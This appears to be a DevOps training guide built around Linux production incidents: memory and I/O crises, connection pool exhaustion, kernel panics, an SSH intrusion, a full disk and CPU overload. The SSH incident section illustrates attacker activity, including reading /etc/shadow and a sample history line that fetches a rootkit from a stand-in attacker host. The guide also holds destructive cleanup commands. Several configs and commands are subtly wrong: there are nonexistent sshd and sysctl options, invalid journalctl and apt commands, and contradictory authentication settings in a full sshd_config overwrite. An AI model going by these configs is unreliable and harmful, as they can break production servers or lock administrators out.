# 🐧 Linux Production Scenarios: 4 Years of Experience - Deep Dive

**Company**: TechFlow Inc. (500+ microservices, billions of transactions daily)  
**Your Role**: Senior DevOps Engineer specializing in Linux infrastructure  
**Current State**: Critical Linux infrastructure needs redesign, compliance, and automation  
**Mission**: Stabilize, optimize, and automate Linux infrastructure across production

---

## 📊 Current Linux Infrastructure Issues

```
Linux Infrastructure Assessment:
├── 200+ Linux servers (RHEL 7, Ubuntu 18.04, mixed versions)
├── No standardized base images
├── Manual server provisioning (takes 4 hours)
├── No centralized logging (logs scattered across servers)
├── Security: No SELinux, weak sudo policies, SSH keys everywhere
├── Performance: Frequent OOM kills, CPU throttling, disk I/O bottlenecks
├── Compliance: Zero audit trails, no change tracking
├── No disaster recovery procedures documented
├── Kernel panic incidents: 3 this quarter (unresolved root causes)
└── Yearly Linux admin overhead: $500K+ (manual patching, troubleshooting)
```

---

# 🎯 SCENARIO 1: CRITICAL OUTAGE - ROOT CAUSE ANALYSIS & REMEDIATION

## Monday 2 AM - Production Outage Alert

**Alert**: Payment processing service DOWN. All 8 servers in the payment-pool returning connection timeouts.

```
Alert Details:
├── Time: 2:05 AM (during sleep hours)
├── Affected: payment-prod-01 through payment-prod-08
├── Error: "Cannot allocate memory" / "Connection refused"
├── Customer Impact: $50K/minute revenue loss
├── Previous Incidents: Similar issue 3 months ago, root cause never documented
└── Your Task: Diagnose and fix within 15 minutes (SLA)
```

---

### Challenge 1.1: Memory Crisis - The System is Out of Memory

**What you see when you SSH in**:

```bash
# You run:
free -h

# Output:
                 total        used        free      shared  buff/cache   available
Mem:           62.8Gi       61.9Gi       500Mi       2.5Gi       850Mi       1.2Gi
Swap:          16Gi        15.8Gi       200Mi

# Immediate reaction: "Why is SWAP being used? We have physical RAM issue!"
```

**Your Investigation Tasks**:

```bash
# TASK 1: Find the memory hog
ps aux --sort=-%mem | head -20
# Output shows: Java process using 48GB (app should use max 8GB!)

# TASK 2: Check process details
cat /proc/<PID>/status | grep -E "VmPeak|VmHWM|VmSize"
# Shows memory is VIRTUAL not RESIDENT

# TASK 3: Deep dive into the process
/proc/<PID>/maps
# Review: Is it memory leak? Allocated but not freed?

# TASK 4: Check system-wide memory status
cat /proc/meminfo
# HugePages_Free, HugePages_Rsvd, MemAvailable vs MemFree difference

# TASK 5: Find processes in SWAP
for pid in $(ps aux | awk '{print $2}'); do
  awk "BEGIN {total=0} /^[0-9]/ {total+=$2} END {if(total>0) \
  print \"$pid: \" total/1024 \" MB\"}" /proc/$pid/smaps 2>/dev/null | \
  grep -v "0 MB"
done

# TASK 6: Check if any process has memory limits
cat /proc/<PID>/limits
# Look for: Max address space, Max locked memory

# TASK 7: Review cgroup memory limits (containers)
cat /sys/fs/cgroup/memory/docker/<CONTAINER_ID>/memory.limit_in_bytes
```

**Root Causes to Investigate**:

| Issue | Command | Expected vs Actual |
|-------|---------|-------------------|
| Memory Leak | `ps aux` + `dmesg \| tail -50` | App uses 8GB, actual 48GB (40GB leak!) |
| Slab Memory | `cat /proc/slabinfo \| tail -20` | Kernel slab not freed after connection spike |
| File Cache | `cat /proc/meminfo` | Cached: 12GB (abnormal, should be <2GB) |
| SWAP Thrashing | `vmstat 1 10` | si/so columns show SWAP I/O spikes |
| Memory Fragmentation | `/proc/buddyinfo` | No free 64-page chunks available |

**The Fix - Multi-step remediation**:

```bash
# STEP 1: Immediate triage - is the app the culprit?
# Check application logs for warnings
tail -1000 /var/log/payment-app/app.log | grep -i "memory\|heap\|pool"

# STEP 2: Check if it's a known memory leak
# Review recent deployments
git log --oneline -20 | head -5

# STEP 3: Force garbage collection if possible (Java apps)
# If your payment app is Java:
jcmd <PID> GC.run

# STEP 4: Check connection pool status
# MySQL/database connections holding memory?
mysql -u devops -p -e "SHOW STATUS LIKE '%Connection%';"
# Normal: Threads_connected: 50-100
# Abnormal: Threads_connected: 1000+ → connection leak

# STEP 5: Dump the heap to analyze
jmap -dump:live,format=b,file=heapdump.bin <PID>
# Transfer to local machine for analysis in Eclipse MAT or JVisualVM

# STEP 6: Find resource limits on the container/process
ulimit -a
# Check: max memory, max processes, max file descriptors

# STEP 7: Emergency mitigations
# 7a. Restart the problematic process (gracefully, if possible)
systemctl restart payment-app

# 7b. Kill the memory hog as last resort (with warning to team)
kill -9 <PID>

# STEP 8: Monitor recovery
watch -n 1 'free -h && ps aux --sort=-%mem | head -5'

# STEP 9: Check if there's a resource cgroup limit applied
systemctl show payment-app -p MemoryMax
systemctl show payment-app -p MemoryHigh

# STEP 10: Check kernel parameters that affect memory
sysctl vm.swappiness  # Default 60 (means swap too aggressively)
sysctl vm.overcommit_memory  # 0=strict, 1=allow overcommit
sysctl vm.overcommit_ratio
```

---

### Challenge 1.2: Disk I/O Crisis - SWAP Thrashing Detected

**Symptom**: Server is responsive in SSH but applications are slow.

```bash
# You check I/O performance:
iostat -x 1 10

# Output shows:
Device: %util=95%, await=500ms (abnormal! should be <20ms)
# Disk utilization is 95%+ and I/O wait is skyrocketing
# Indicates SWAP thrashing or disk saturation

# Check SWAP I/O specifically
vmstat 1 10
# Look at 'si' and 'so' columns
# si=1000, so=5000 = SWAP IN/OUT rates (pages per second)
# This is catastrophic → memory pressure forcing page thrashing
```

**Investigation & Root Cause**:

```bash
# TASK 1: Find which process is causing I/O
iostat -x -d -k <DEVICE> 1 10 | head -30

# TASK 2: Identify processes doing disk I/O
for pid in $(pgrep -f "payment"); do
  echo "PID: $pid"
  cat /proc/$pid/io | grep -E "read_bytes|write_bytes"
done

# TASK 3: Check if it's write amplification (SSD/EBS)
fio --name=benchmark --ioengine=libaio --iodepth=32 \
    --rw=randread --bs=4k --runtime=60 --numjobs=4

# TASK 4: Real-time disk I/O monitoring by process
iotop -o -b -n 1

# TASK 5: Check page cache pressure
cat /proc/pressure/memory

# TASK 6: Review pending I/O
cat /proc/<PID>/io
# Read/write bytes and operations

# TASK 7: Check for stuck I/O
dmesg | tail -50 | grep -i "i/o\|hung\|blocked"
```

**The Fix**:

```bash
# FIX 1: Reduce SWAP aggressiveness
# Current: vm.swappiness=60 (uses SWAP too aggressively)
sudo sysctl -w vm.swappiness=10  # Be conservative with SWAP
sudo sysctl -w vm.swappiness=0   # Modern systems: disable SWAP swapping, only emergency

# Make persistent
echo "vm.swappiness = 10" | sudo tee -a /etc/sysctl.d/99-memory.conf
sudo sysctl -p /etc/sysctl.d/99-memory.conf

# FIX 2: Tune memory write-back
sudo sysctl -w vm.dirty_ratio=5           # % of memory before write-back
sudo sysctl -w vm.dirty_background_ratio=2  # Async write-back threshold
sudo sysctl -w vm.dirty_writeback_centisecs=100  # How often to flush

# FIX 3: Restrict application memory usage (cgroup)
# Create cgroup memory limit
cgcreate -g memory:/payment-app
echo "8589934592" > /sys/fs/cgroup/memory/payment-app/memory.limit_in_bytes  # 8GB
# Move payment app PID to this group
echo <PID> > /sys/fs/cgroup/memory/payment-app/cgroup.procs

# FIX 4: Persistent cgroup setup via systemd
cat > /etc/systemd/system/payment-app.service << 'EOF'
[Unit]
Description=Payment Processing Application
After=network.target

[Service]
Type=simple
User=payment
ExecStart=/opt/payment-app/bin/start.sh
MemoryMax=8G           # Hard limit: 8GB
MemoryHigh=7G          # Warning threshold: 7GB (triggers page pressure)
CPUQuota=400%          # 4 cores
CPUAccounting=true
MemoryAccounting=true
TasksMax=1000

# Restart on OOM
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl restart payment-app

# FIX 5: Monitor memory post-fix
watch -n 1 'free -h && cat /proc/meminfo | grep -E "MemAvailable|Cached|Slab"'
```

---

### Challenge 1.3: Connection Pool Exhaustion

**Symptom**: Application accepting connections but returning "No more connections available"

```bash
# Check open connections
netstat -an | grep -c ESTABLISHED  # High number: 2000+
netstat -an | grep ESTABLISHED | awk '{print $4}' | awk -F: '{print $(NF-1)}' | sort | uniq -c | sort -rn
# Shows: 150 connections to database (limit is usually 100)
```

**Investigation**:

```bash
# TASK 1: Check MySQL/PostgreSQL connection status
mysql -u admin -p -e "SHOW STATUS LIKE 'Threads%';"
# Threads_connected should be < max_connections

# TASK 2: List all connections
mysql -u admin -p -e "SELECT ID, USER, HOST, STATE, TIME FROM INFORMATION_SCHEMA.PROCESSLIST;"

# TASK 3: Find idle connections (problem!)
mysql -u admin -p -e "SELECT ID, USER, HOST, STATE, TIME FROM INFORMATION_SCHEMA.PROCESSLIST \
       WHERE STATE IS NULL OR STATE = 'Sleep' ORDER BY TIME DESC LIMIT 20;"

# TASK 4: Check application connection pool settings
grep -r "max.pool.size\|maxPoolSize\|connection.pool.size" /opt/payment-app/config/

# TASK 5: View application connection metrics
curl -s http://localhost:8080/actuator/metrics/db.connection.active | jq .

# TASK 6: Check kernel TCP connections
ss -an | grep tcp | wc -l
ss -an | grep tcp | grep ESTABLISHED | wc -l
```

**Root Cause Scenarios & Fixes**:

| Scenario | Symptom | Fix |
|----------|---------|-----|
| Connection Leak | Pool size growing, never released | Application code review + connection timeout |
| DB Restart During Deploy | Connections not recycled | Add connection retry logic |
| Network Timeout | Connections stuck in TIME_WAIT | Reduce TCP_TIME_WAIT (risky) or pool timeout |
| Connection Timeout Too Long | App waits forever | Set pool timeout: 30 seconds |

**The Fix**:

```bash
# FIX 1: Restart database to clear stuck connections
# With zero-downtime using read replicas:
# 1. Failover to replica
# 2. Restart primary
# 3. Resync and failback

# FIX 2: Force close idle connections (MySQL)
mysql -u admin -p -e "SET GLOBAL max_connect_errors = 10000;"
mysql -u admin -p -e "FLUSH HOSTS;"

# FIX 3: Tune kernel TCP parameters
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048
sudo sysctl -w net.ipv4.tcp_fin_timeout=30     # Reduce TIME_WAIT duration
sudo sysctl -w net.ipv4.tcp_tw_reuse=1         # Reuse TIME_WAIT connections

# FIX 4: Update application connection pool (config file)
cat > /opt/payment-app/config/database.yml << 'EOF'
database:
  host: payment-db.internal
  port: 3306
  pool:
    size: 20                  # Connection pool size
    min_idle: 5               # Minimum connections to maintain
    max_lifetime: 300         # Max connection age (5 minutes)
    idle_timeout: 30          # Close idle connections after 30s
    connection_timeout: 10    # Timeout for acquiring connection
EOF

# FIX 5: Monitor pool health
watch -n 5 'echo "Active connections:" && \
  curl -s http://localhost:8080/actuator/metrics/db.connection.active && \
  echo "Idle connections:" && \
  curl -s http://localhost:8080/actuator/metrics/db.connection.idle'
```

---

### Challenge 1.4: Linux Kernel Panic Prevention

**What happened**: 3 months ago, kernel panicked. Logs are gone. Can't prevent next one.

```bash
# Check current panic settings
cat /proc/sys/kernel/panic
cat /proc/sys/kernel/panic_on_oops

# Default: panic=0 (freeze on panic, no auto-reboot)
# Problem: Stuck server, need manual reboot intervention
```

**Investigation & Prevention**:

```bash
# TASK 1: Check panic logs
journalctl -u kernel | tail -100
dmesg | tail -100
# Look for: Kernel panic, stack trace, OOM killer invocations

# TASK 2: Check for recurring patterns
dmesg | grep -i "error\|fail\|panic\|oops" | tail -50

# TASK 3: Enable kernel debugging
cat /proc/cmdline  # View current kernel parameters

# TASK 4: Monitor for OOM condition
dmesg | tail -50 | grep -i "out of memory"

# TASK 5: Check kdump (kernel crash dump) configuration
kdump-config status
systemctl status kdump.service

# TASK 6: Review syslog for persistent issues
grep -i "kernel\|panic\|oops" /var/log/syslog
```

**The Fix - Production Kernel Safety**:

```bash
# FIX 1: Configure kernel panic to auto-reboot (critical for HA)
sudo sysctl -w kernel.panic=30          # Reboot 30 seconds after panic
sudo sysctl -w kernel.panic_on_oops=1   # Panic on OOPS (more aggressive)

# Make persistent
cat > /etc/sysctl.d/99-panic.conf << 'EOF'
# Auto-reboot on kernel panic
kernel.panic = 30
kernel.panic_on_oops = 1
kernel.kptr_restrict = 1      # Hide kernel addresses (security)
kernel.dmesg_restrict = 1     # Restrict dmesg access

# Enable crash dumps for analysis
kernel.crash_on_hang = 60     # Panic if system hangs for 60s
EOF

sudo sysctl -p

# FIX 2: Install and configure kdump for post-mortem analysis
sudo apt-get install -y linux-crashdump
kdump-config dump-to-file
kdump-config enable

# FIX 3: Configure permanent panic/crash logging
# Edit /etc/kdump.conf
cat >> /etc/kdump.conf << 'EOF'
path /var/crash
core_collector makedumpfile -l --message-level 1 -d 31
EOF

# FIX 4: Test kdump setup
kdump-config show
kdump-config test

# FIX 5: Configure crash kernel memory (grub)
# Ensure /etc/default/grub has:
# GRUB_CMDLINE_LINUX_DEFAULT="... crashkernel=256M ..."
sudo update-grub

# FIX 6: Set up netdump for remote crash analysis (optional, enterprise)
# Allows dumping to remote syslog server instead of local disk

# FIX 7: Monitor kernel errors in real-time
watch -n 2 'dmesg | tail -20'

# FIX 8: Set up alerts for kernel issues
cat > /etc/rsyslog.d/99-kernel-alerts.conf << 'EOF'
:programname, isequal, "kernel" :omusrmsg:sysadmin@company.com
:programname, isequal, "kernel" @@syslog-server.internal:514
EOF

sudo systemctl restart rsyslog
```

---

## 📋 SCENARIO 2: SECURITY INCIDENT - UNAUTHORIZED SSH ACCESS

**Incident**: Unauthorized SSH login detected from IP `203.0.113.45` (random internet).

```
Timeline:
├── 3:15 PM: Anomaly detection triggers
├── 3:16 PM: Attacker ran: cat /etc/shadow, cat /root/.bash_history
├── 3:17 PM: Attacker attempted: ssh-keygen to install persistence
├── 3:20 PM: Security team alerts you
└── Your Task: Isolate, investigate, remediate, prevent recurrence
```

---

### Challenge 2.1: SSH Forensics & Response

**What you need to do immediately**:

```bash
# STEP 1: Verify the breach (don't panic, confirm it's real)
# Check failed/successful logins
grep "sshd.*Accepted\|Failed" /var/log/auth.log | tail -100
# Shows: "Accepted publickey for root from 203.0.113.45 port 54321 ssh2"

# STEP 2: Identify the compromised user and access method
# Get all successful logins
lastb -f /var/log/btmp | head -20
last -f /var/log/wtmp | grep -v reboot | head -20

# STEP 3: Find all active sessions
w -h
ps aux | grep sshd
# Shows: sshd [net] from 203.0.113.45 (active connection!)

# STEP 4: Audit SSH keys for intrusions
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys | nl
# Check for suspicious entries (not your usual keys!)

# STEP 5: Check for SSH backdoors installed
find /root /home -name "*.pub" -o -name "id_rsa" -o -name ".ssh_config"

# STEP 6: Check SSHD configuration for weaknesses
grep -E "^PermitRootLogin|^PasswordAuthentication|^PubkeyAuthentication|^PermitEmptyPasswords" /etc/ssh/sshd_config
# If shows: PermitRootLogin=yes, PasswordAuthentication=yes → VULNERABILITY!

# STEP 7: Search for attacker artifacts
find / -name ".rhosts" -o -name ".shosts" -o -name "authorized_keys2" 2>/dev/null
find /tmp -name ".*" -type f -mtime -1  # Files modified in last day
```

**Forensic Analysis - Command History**:

```bash
# TASK 1: Extract attacker's command history
# From SSHD logs, find the session PID
grep "Accepted publickey.*203.0.113.45" /var/log/auth.log
# Output: "sshd[12345]: Accepted publickey for root from 203.0.113.45"

# TASK 2: Reconstruct commands from process accounting (if enabled)
# Check if process accounting is on
systemctl status psacct  # Debian/Ubuntu
systemctl status psacct  # RHEL

# If enabled, dump the process log:
dump-acct /var/log/account/pacct | grep "12345\|root"

# TASK 3: Search for shell history (if attacker spawned shell)
sudo cat /root/.bash_history | tail -50
# May show: wget http://attacker.com/rootkit.sh, nmap scan, etc.

# TASK 4: Check for cron job persistence
crontab -u root -l
ls -la /etc/cron.d/
grep -r "root" /etc/cron.* | grep -v "^#"

# TASK 5: Look for package installation attempts (rootkit?)
apt history | grep -E "2026-03-31|suspicious"
rpm -qa --last | head -20  # Recently installed packages

# TASK 6: Check for kernel modules (rootkit detection)
lsmod | wc -l  # Are there unexpected modules?
```

**Immediate Containment**:

```bash
# CONTAINMENT 1: Disconnect all active sessions
# Find and disconnect the attacker
pkill -u root sshd
# OR kill specific session
kill -9 <PID>

# CONTAINMENT 2: Revoke all SSH keys immediately
> ~/.ssh/authorized_keys
> /root/.ssh/authorized_keys

# CONTAINMENT 3: Force password change
passwd root
# Generate strong password: $(openssl rand -base64 32)

# CONTAINMENT 4: Disable root SSH access
sudo sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# CONTAINMENT 5: Restart SSH
sudo systemctl restart sshd

# CONTAINMENT 6: Scan for rootkits/malware
sudo apt-get install -y rkhunter chkrootkit
sudo rkhunter --check --skip-keypress --report-warnings-only
sudo chkrootkit

# CONTAINMENT 7: Isolate from network (if severe)
# Remove from load balancer:
# 1. Stop accepting new connections
sudo /opt/lb-agent/deregister-from-lb.sh
# 2. Wait for drain:
sleep 30
# 3. Rebuild or offline for analysis
```

---

### Challenge 2.2: Prevent SSH Compromise (Hardening)

**Goal**: Make SSH breach nearly impossible with defense-in-depth.

```bash
# HARDENING 1: SSH Access Control - Jump Host Architecture
# Never expose SSH directly to internet!
# Instead: Developer -> Jump Host -> Internal servers

# /etc/ssh/sshd_config on internal servers:
cat > /etc/ssh/sshd_config << 'EOF'
# === PRODUCTION SSH HARDENING ===

# Network binding
Port 22222                                    # Non-standard port (security through obscurity)
AddressFamily inet                            # IPv4 only (unless IPv6 needed)
ListenAddress 10.0.1.0                       # Internal network only

# Authentication
PermitRootLogin no                            # Never allow root SSH
StrictModes yes                               # Check .ssh permissions
PubkeyAuthentication yes                      # Only key-based auth
PasswordAuthentication no                     # No passwords!
PermitEmptyPasswords no
MaxAuthTries 3                                # Fail after 3 attempts
MaxSessions 10                                # Max concurrent sessions

# Authorization
AllowUsers devops@* payment@* jenkins@10.0.1.5 # Whitelist users and sources
AllowGroups ssh-users
DenyUsers root nobody                         # Explicitly deny dangerous users
DenyGroups noroot

# X11 Forwarding & Tunneling
X11Forwarding no                              # Disable GUI forwarding
AllowAgentForwarding no
AllowTcpForwarding no
GatewayPorts no

# Security Hardening
ProtocolKeepAlives yes
ClientAliveInterval 300                       # 5 minute idle timeout
ClientAliveCountMax 2                         # Disconnect if unresponsive
Compression delayed                           # Only after auth
TCPKeepAlive yes
UsePAM yes

# Logging & Monitoring
SyslogFacility AUTH
LogLevel VERBOSE                              # Log all attempts

# Key Exchange & Encryption (Modern algorithms only)
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512

# 2FA / MFA
AuthenticationMethods "publickey,password"    # Require both key AND password
ChallengeResponseAuthentication yes           # Enable TOTP/Google Authenticator

# Subsystem
Subsystem sftp /usr/lib/openssh/sftp-server -f AUTHPRIV -l INFO

EOF

sudo systemctl restart sshd
```

**Firewall & Network Security**:

```bash
# FIREWALL 1: Restrict SSH to known IPs only
# /etc/hosts.allow
sshd: 10.0.1.0/24                             # Internal network only
sshd: 10.0.2.50                               # Jump host IP
sshd: 203.0.113.5                             # VPN gateway

# /etc/hosts.deny
sshd: ALL                                     # Deny all others

# Apply
sudo systemctl restart networking

# FIREWALL 2: iptables rules (stateful firewall)
sudo iptables -A INPUT -i eth0 -p tcp --dport 22222 -s 10.0.0.0/8 -j ACCEPT
sudo iptables -A INPUT -i eth0 -p tcp --dport 22222 -j DROP
sudo iptables-save > /etc/iptables/rules.v4

# FIREWALL 3: Fail2Ban - Automatic attacker blocking
sudo apt-get install -y fail2ban

cat > /etc/fail2ban/jail.local << 'EOF'
[DEFAULT]
maxretry = 3
findtime = 600
bantime = 3600

[sshd]
enabled = true
port = 22222
logpath = /var/log/auth.log
maxretry = 2
bantime = 7200               # Ban for 2 hours

[sshd-ddos]
enabled = true
port = 22222
logpath = /var/log/auth.log
maxretry = 10
bantime = 1800
findtime = 60

EOF

sudo systemctl restart fail2ban
```

**PAM & Authentication Hardening**:

```bash
# PAM 1: Install Google Authenticator (2FA)
sudo apt-get install -y libpam-google-authenticator

# For each user
sudo -u devops google-authenticator
# Follow prompts, save emergency codes

# PAM 2: Configure SSH to require TOTP + key
cat >> /etc/pam.d/sshd << 'EOF'
# Google Authenticator (TOTP)
auth required pam_google_authenticator.so nullok
EOF

# PAM 3: Update SSH to use PAM for password
echo "AuthenticationMethods publickey,keyboard-interactive:pam" >> /etc/ssh/sshd_config
sudo systemctl restart sshd

# PAM 4: Enforce strong sudo passwords
cat > /etc/pam.d/sudo << 'EOF'
session required pam_limits.so
@include common-auth
@include common-account
session required pam_permit.so
EOF

# PAM 5: Add sudo login attempts logging
cat >> /etc/pam.d/sudo-log << 'EOF'
account required pam_permit.so
EOF
```

**Monitoring & Detection**:

```bash
# DETECTION 1: Real-time SSH monitoring
tail -f /var/log/auth.log | grep -E "Accepted|Failed|Invalid"

# DETECTION 2: Set up SIEM export
cat > /etc/rsyslog.d/99-ssh-siem.conf << 'EOF'
:programname, isequal, "sshd" @@siem-server.company.com:514
:programname, isequal, "sshd" /var/log/ssh-audit.log
EOF

sudo systemctl restart rsyslog

# DETECTION 3: Alerting for anomalies
cat > /usr/local/bin/ssh-anomaly-check.sh << 'EOF'
#!/bin/bash
# Alert if more than 10 failed logins in 5 min
FAILED_ATTEMPTS=$(grep "Failed" /var/log/auth.log | grep "$(date '+%b %d %H:%M')" | wc -l)
if [ $FAILED_ATTEMPTS -gt 10 ]; then
  echo "SSH attack detected: $FAILED_ATTEMPTS failed attempts" | \
    mail -s "ALERT: SSH Brute Force Attempt" security@company.com
fi
EOF

chmod +x /usr/local/bin/ssh-anomaly-check.sh

# Add to cron
echo "*/5 * * * * /usr/local/bin/ssh-anomaly-check.sh" | crontab -

# DETECTION 4: Monitor sudo usage (privilege escalation)
grep "sudo:" /var/log/auth.log | tail -20
```

---

## 📋 SCENARIO 3: DISK SPACE CRISIS - FULL FILESYSTEM

**Alert**: `/` filesystem is 99% full. System becoming unresponsive.

```
Status:
├── / (root): 99% used (only 100MB free)
├── Services affected: All (can't write logs, can't temp files)
├── Immediate risk: System crash, data corruption
└── You have 10 minutes to free up space
```

---

### Challenge 3.1: Emergency Disk Cleanup

```bash
# EMERGENCY 1: Find large files/directories
du -sh /* | sort -rh | head -20
# Shows: /var: 180GB, /home: 45GB, /opt: 30GB

# EMERGENCY 2: Drill down to the culprit
du -sh /var/* | sort -rh | head -20
du -sh /var/log/* | sort -rh | head -20
du -sh /var/log/payment-app/* | sort -rh
# Finds: /var/log/payment-app/app.log: 120GB!

# EMERGENCY 3: Check what's preventing deletion
lsof /var/log/payment-app/app.log | head -20
# Shows: payment-app[12345] has file open (can't just delete!)

# EMERGENCY 4: Safely truncate file without losing app reference
truncate -s 0 /var/log/payment-app/app.log
# OR
> /var/log/payment-app/app.log
# Frees 120GB immediately!

# EMERGENCY 5: Verify space is freed
df -h /
# Should see significant improvement

# EMERGENCY 6: Clean up other log files
journalctl --vacuum=100M          # Keep only 100MB of journal
rm -rf /var/log/*.1 /var/log/*.gz  # Old rotated logs
apt-get clean                      # Clean apt cache
rm -rf /tmp/*                      # Clean temp files

# Verify again
df -h /

# Total freed: ~150GB = crisis averted!
```

---

### Challenge 3.2: Implement Disk Space Monitoring

```bash
# MONITORING 1: Automated log rotation (prevent future crises)
cat > /etc/logrotate.d/payment-app << 'EOF'
/var/log/payment-app/*.log {
    size 100M                   # Rotate when file reaches 100MB
    daily                       # Check daily
    rotate 10                   # Keep 10 old logs
    compress                    # Gzip compressed
    delaycompress               # Compress old logs next rotation
    notifempty                  # Don't rotate empty logs
    create 0640 payment payment # Create new file with permissions
    sharedscripts
    postrotate
        /bin/systemctl reload payment-app > /dev/null 2>&1 || true
    endscript
}
EOF

# Test rotation
logrotate -v -f /etc/logrotate.d/payment-app

# MONITORING 2: Disk space alerts
cat > /usr/local/bin/disk-check.sh << 'EOF'
#!/bin/bash
THRESHOLD=90

for partition in /dev/xvda1 /dev/xvdb1; do
    USAGE=$(df $partition | awk 'NR==2 {print $5}' | sed 's/%//')
    if [ $USAGE -gt $THRESHOLD ]; then
        echo "ALERT: $partition is $USAGE% full" | \
        mail -s "CRITICAL: Disk Space Alert" devops@company.com
        
        # Log to monitoring system
        curl -X POST http://monitoring.internal/api/alerts \
             -d "partition=$partition&usage=$USAGE"
    fi
done
EOF

chmod +x /usr/local/bin/disk-check.sh

# Add to cron (check every 15 minutes)
echo "*/15 * * * * /usr/local/bin/disk-check.sh" | crontab -

# MONITORING 3: Setup with systemd timer (modern approach)
cat > /etc/systemd/system/disk-check.service << 'EOF'
[Unit]
Description=Disk Space Check
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/disk-check.sh
EOF

cat > /etc/systemd/system/disk-check.timer << 'EOF'
[Unit]
Description=Disk Space Check Timer

[Timer]
OnBootSec=1min
OnUnitActiveSec=15min

[Install]
WantedBy=timers.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable disk-check.timer
sudo systemctl start disk-check.timer
sudo systemctl list-timers disk-check.timer

# MONITORING 4: Configure systemd journal size limits
mkdir -p /etc/systemd/journald.conf.d/
cat > /etc/systemd/journald.conf.d/99-limit.conf << 'EOF'
[Journal]
SystemMaxUse=5G                 # Max 5GB for system journal
SystemMaxFileSize=500M          # Max 500MB per journal file
RuntimeMaxUse=1G                # Max 1GB for runtime journal
MaxRetentionSec=30d             # Keep 30 days of journal
EOF

sudo systemctl restart systemd-journald

# MONITORING 5: Monitor inodes (not just disk space!)
df -i
# If inodes are 90%+ full, you can't create files even with space left!

# Find inode hogs
find / -xdev -printf '%h\n' 2>/dev/null | sort | uniq -c | sort -rn | head -20

# Clean up small files if needed
find /tmp -type f -mtime +30 -delete  # Files older than 30 days
find /var/tmp -type f -mtime +30 -delete
```

---

## 📋 SCENARIO 4: PERFORMANCE DEGRADATION - CPU & LOAD AVERAGE CRISIS

**Alert**: Load average 150 (system has 16 cores). Applications timing out.

```
Status:
├── Load average: 150 (16-core system, should be <16)
├── CPU utilization: 95% (but WHERE?)
├── Context switches: 500K/second (abnormal)
└── Response time: 30 seconds (should be 100ms)
```

---

### Challenge 4.1: CPU Analysis & Troubleshooting

```bash
# ANALYSIS 1: Get CPU overview
lscpu
# Shows: 16 CPUs, Architecture: x86_64

# ANALYSIS 2: Check real-time CPU load
top -b -n 1 | head -20
# Shows: %user, %sys, %idle, %wa (I/O wait)

# ANALYSIS 3: Per-CPU breakdown
mpstat -P ALL 1 10
# Shows each CPU core individually

# ANALYSIS 4: Detailed load analysis
uptime
# Loads: 150.5, 145.2, 140.1 (1min, 5min, 15min)

# ANALYSIS 5: Process accounting - who's using CPU?
ps aux --sort=-%cpu | head -20
# Shows: payment-app 95%, nginx 3%, system processes 2%

# ANALYSIS 6: Deep dive into CPU hog process
top -p <PID> -b -n 1
# Shows detailed CPU breakdown

# ANALYSIS 7: Check thread count (runaway threads?)
ps -eLf | wc -l  # Total threads
ps -eLf | grep payment-app | wc -l  # Payment app threads

# Expected: 50-100 threads
# Actual: 5000 threads → PROBLEM!

# ANALYSIS 8: Check context switches
cat /proc/stat | grep ctxt
vmstat 1 10
# Look at 'cs' column (context switches)
# Normal: <10K/sec, High: >100K/sec = excessive scheduling overhead

# ANALYSIS 9: Find runaway threads
for pid in $(ps aux | grep payment-app | awk '{print $2}'); do
    echo "PID $pid threads:"
    ps -o nlwp= -p $pid
done

# ANALYSIS 10: Investigate process bottleneck
strace -c -p <PID>
# Shows which syscalls are slow

perf top -p <PID>
# Shows where CPU cycles are being spent (requires kernel debugging)
```

**Root Causes & Solutions**:

| Symptom | Root Cause | Fix |
|---------|-----------|-----|
| High %user | Application CPU-bound | Optimize code, scale horizontally |
| High %sys | Kernel overhead | Check I/O, filesystem, locking |
| High %wa | I/O bottleneck | Check disk I/O, network |
| High %irq | Network/device interrupts | Check NIC driver, tune IRQ affinity |

**The Fix - CPU Optimization**:

```bash
# FIX 1: Reduce thread count (if application has runaway threads)
# Contact app team to reduce ThreadPoolSize
# OR kill and restart the process
systemctl restart payment-app

# FIX 2: Check for CPU affinity issues
# Ensure threads are distributed across cores, not pinned to one
taskset -p -c 0-15 <PID>  # Distribute across all 16 cores

# FIX 3: Tune CPU scheduler
# Check current scheduler
cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
# Usually: "powersave" (slow but power efficient)

# Switch to performance mode
for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
  echo "performance" > "$cpu"
done

# FIX 4: Disable CPU throttling/turbo boost limits (if safe)
echo 100 > /sys/devices/system/cpu/intel_pstate/min_perf_pct

# FIX 5: Optimize interrupt handling
# Check where interrupts are coming from
cat /proc/interrupts | head -20

# Set CPU affinity for interrupts
cat > /etc/default/irqbalance << 'EOF'
IRQBALANCE_ONESHOT=yes
IRQBALANCE_ARGS="-m performance"
EOF

systemctl restart irqbalance

# FIX 6: Scale horizontally if peak CPU is sustained
# Spin up additional payment-app instances
# Or move traffic to another server

# FIX 7: Monitor CPU after fixes
watch -n 1 'uptime && echo "---" && top -b -n 1 | head -5 && echo "---" && vmstat 1 1'
```

---

### Challenge 4.2: I/O Wait Crisis (High %wa)

```bash
# Symptom: High CPU %wa (I/O wait)
# This means: CPU is waiting for disk I/O, not actually working

# INVESTIGATION
vmstat 1 10
# If %wa > 20%, you have I/O bottleneck

# Find I/O bottleneck source
iostat -x -d -k 1 10
# Shows: %util, await, r_await, w_await for each disk

# Look for:
# - %util > 80% = disk saturation
# - await > 50ms = high I/O latency (should be <5ms)
# - w_await >> r_await = write-heavy (could be logs, databases)

# Find problematic processes
iotop -o -b -n 1 -q
# Shows which process is doing I/O

# Check disk type
lsblk -d -o NAME,ROTA,SIZE
# ROTA=0 = SSD (fast), ROTA=1 = HDD (slow)

# THE FIX
# If HDD: upgrade to SSD
# If SSD: check for write amplification, enable TRIM
fstrim -v /

